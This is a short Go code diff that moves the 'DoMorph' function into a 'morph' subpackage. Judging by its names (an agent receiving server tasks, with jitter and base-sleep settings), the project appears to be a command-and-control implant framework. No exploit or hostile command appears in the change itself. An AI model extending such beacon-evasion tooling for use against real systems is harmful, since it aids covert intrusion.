@@ -4,7 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
-	"numinon_shadow/internal/agent/command"
+	"numinon_shadow/internal/agent/command/morph"
 	"numinon_shadow/internal/models"
 	"strings"
 )
@@ -30,7 +30,7 @@ func (a *Agent) orchestrateMorph(task models.ServerTaskResponse) models.AgentTas
 		task.TaskID, args.Jitter, args.BaseSleep)
 
 	// Call the "doer" function
-	morphResult, err := command.DoMorph(args)
+	morphResult, err := morph.DoMorph(args)
 
 	// Prepare the final TaskResult
 	finalResult := models.AgentTaskResult{
